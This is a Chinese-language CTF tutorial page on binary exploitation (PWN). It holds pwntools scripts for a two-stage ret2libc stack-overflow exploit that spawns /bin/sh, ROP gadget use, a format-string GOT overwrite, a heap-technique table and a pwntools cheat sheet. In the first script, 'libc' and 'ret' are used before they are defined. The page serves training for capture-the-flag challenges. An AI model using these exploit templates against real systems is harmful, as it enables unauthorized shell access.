# CTF PWN 与二进制安全

> PWN = 通过二进制漏洞获取 shell 控制权，CTF 中难度最高但最有成就感的题型。

---

## 前置技能

| 技能 | 说明 | 资源 |
|------|------|------|
| x86/x64 汇编 | MOV/PUSH/POP/CALL/RET 等 | [x86-64 速查表](https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf) |
| GDB 调试 | pwndbg / gef / peda | `gdb ./pwn` |
| Python pwntools | CTF 标配利用库 | `pip install pwntools` |
| ELF 结构 | PLT/GOT/RELRO/PIE | `readelf -a binary` |
| 逆向工程 | IDA Pro / Ghidra | Ghidra 免费开源 |

## 常见漏洞类型

### 1. 栈溢出（Stack Overflow）

```python
from pwn import *

p = process('./vuln')

# 寻找偏移量
# cyclic 生成模式字符串
payload = cyclic(200)
p.sendline(payload)

# 用 gdb 找到 crash 位置
# core dump → gdb ./vuln core
# $rsp = 0x6161616c6161616b → cyclic -l 0x6161616c6161616b = 120

# 经典 ret2libc
offset = 120
pop_rdi = 0x4007c3          # ROP gadget
puts_plt = 0x400520         # puts@plt
puts_got = 0x601018         # puts@got
main = 0x400686             # main 函数

# stage 1: leak libc 地址
p.sendline(flat([
    b'A' * offset,
    pop_rdi, puts_got, puts_plt,
    main
]))

# 计算 libc base
leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
libc_base = leaked - libc.symbols['puts']
system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

# stage 2: getshell
p.sendline(flat([
    b'A' * offset,
    ret,                    # 栈对齐
    pop_rdi, bin_sh,
    system
]))

p.interactive()
```

### 2. ROP 链构造

```python
# ROPgadget 查找
# ROPgadget --binary libc.so.6 | grep "pop rdi"

# 需要消除的函数
# 1. puts/printf → leak libc
# 2. system("/bin/sh") → getshell

# 栈对齐问题（movaps 指令要求 16 字节对齐）
# 在 system 前加一个 ret gadget 即可
ret = 0x4004a6
```

### 3. 格式化字符串

```c
// ❌ 漏洞代码
printf(user_input);
// ✅ 修复
printf("%s", user_input);
```

```python
from pwn import *

# %p 泄露栈数据
payload = b'%p.%p.%p.%p.%p.%p.%p.%p.%p.%p'

# %n 任意写（利用 %n 写入内存）
# %n — 写入 4 字节
# %hn — 写入 2 字节
# %hhn — 写入 1 字节

# 覆盖 GOT 表
# 目标: 将 printf@got 改为 system
printf_got = 0x601020        # objdump -R ./vuln | grep printf

# 需要写入 0x7ffff7a52390 (system 地址)
# 拆分为 2 字节写入
writes = {
    printf_got:     0x2390,
    printf_got + 2: 0xf7a5,
    printf_got + 4: 0x7fff
}
payload = fmtstr_payload(6, writes)
```

### 4. 堆利用

| 漏洞 | 原理 | 利用方式 |
|------|------|---------|
| Use After Free | 释放后仍使用指针 | 伪造对象/vtable |
| Double Free | 同一块内存释放两次 | tcache dup |
| Heap Overflow | 堆块写入超出边界 | 覆盖相邻 chunk |
| Tcache Poisoning | 篡改 tcache 链表 | 任意地址分配 |

## pwntools 速查

```python
from pwn import *

# 本地/远程连接
p = process('./chall')
p = remote('ctf.example.com', 1337)
p = gdb.debug('./chall', 'break main')

# 数据收发
p.send(b'data')
p.sendline(b'data')
p.recv(1024)          # 接收 n bytes
p.recvline()           # 接收一行
p.recvuntil(b'>')      # 接收直到指定字符
p.recvall()            # 接收所有

# 打包/解包
p64(0xdeadbeef)                    # 整形转 8 字节
u64(p.recv(8))                     # 字节解为整形
flat(['A'*24, 0x400000, p64(0)])  # 组合 payload

# ELF 操作
elf = ELF('./chall')
elf.symbols['main']                # 符号地址
elf.got['puts']                    # GOT 地址
elf.plt['puts']                    # PLT 地址
elf.search(b'/bin/sh').__next__()  # 搜索字符串

# Libc
libc = ELF('./libc.so.6')
libc.symbols['system']
libc.symbols['__libc_start_main']
```

## 训练资源

| 平台 | 特点 | 难度 |
|------|------|------|
| PwnableKr | 经典入门 | ⭐⭐ |
| CTF-Wiki | 知识体系完整 | ⭐~⭐⭐⭐⭐⭐ |
| Nightmare | Writeup 详细 | ⭐~⭐⭐⭐ |
| ROP Emporium | ROP 专项训练 | ⭐⭐⭐ |
| HeapLAB | 堆专项 | ⭐⭐⭐⭐ |
| How2Heap | 堆技巧大全 | ⭐⭐⭐~⭐⭐⭐⭐⭐ |

*上一篇：[CTF Web 题型与解题思路](03-ctf-web.md)*

*下一篇：[CTF 密码学与取证分析](05-ctf-crypto-forensics.md)*
